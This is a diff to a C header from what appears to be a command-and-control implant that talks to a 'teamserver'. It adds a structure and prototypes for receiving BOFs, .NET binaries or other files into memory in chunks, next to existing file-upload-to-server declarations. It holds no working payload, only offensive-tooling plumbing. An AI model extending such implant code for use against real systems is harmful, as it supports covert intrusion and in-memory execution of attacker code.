@@ -44,6 +44,28 @@ typedef struct _DOWNLOAD_DATA
     struct _DOWNLOAD_DATA* Next;
 } DOWNLOAD_DATA, *PDOWNLOAD_DATA;
 
+/* This can be a BOF, a .NET binary or a generic file */
+typedef struct _MEM_FILE
+{
+    /* Some random ID so both teamserver and agent knows what MemFile it is */
+    ULONG32 ID;
+
+    /* Size of the MemFile. */
+    SIZE_T Size;
+
+    /* What we already read. */
+    SIZE_T ReadSize;
+
+    /* Pointer to file contents */
+    PVOID Data;
+
+    /* Has the entire file been recieved? */
+    BOOL IsCompleted;
+
+    /* Next file in linked list */
+    struct _MEM_FILE* Next;
+} MEM_FILE, *PMEM_FILE;
+
 /* Add file to linked list with type (upload/download) */
 PDOWNLOAD_DATA DownloadAdd( HANDLE hFile, DWORD MaxSize );
 
@@ -54,5 +76,16 @@ BOOL DownloadRemove( DWORD FileID );
 
 /* send file chunks to team server */
 VOID DownloadPush();
+
+BOOL MemFileIsNew( ULONG32 ID );
+
+PMEM_FILE GetMemFile( ULONG32 ID );
+
+PMEM_FILE MemFileReadChunk( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize );
+
+/* Add a DataBlock to linked list */
+PMEM_FILE NewMemFile( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize );
+
+PMEM_FILE ProcessMemFileChunk( ULONG32 ID, SIZE_T Size, PVOID Data, ULONG32 ReadSize );
 
 #endif
